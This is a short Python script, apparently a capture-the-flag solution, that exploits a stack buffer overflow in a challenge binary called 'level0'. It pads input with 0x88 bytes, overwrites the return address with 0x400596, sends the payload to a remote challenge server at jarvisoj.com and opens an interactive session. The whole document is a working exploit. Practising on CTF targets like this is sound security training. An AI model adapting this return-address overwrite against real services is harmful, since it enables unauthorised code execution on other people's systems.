import zio

junk = "A" * 0x88
address = "\x96\x05\x40\x00\x00\x00\x00"
payload = junk + address

# Io = zio.zio("./level0")
Io = zio.zio(("pwn2.jarvisoj.com", 9881))
Io.write(payload)
Io.interact()
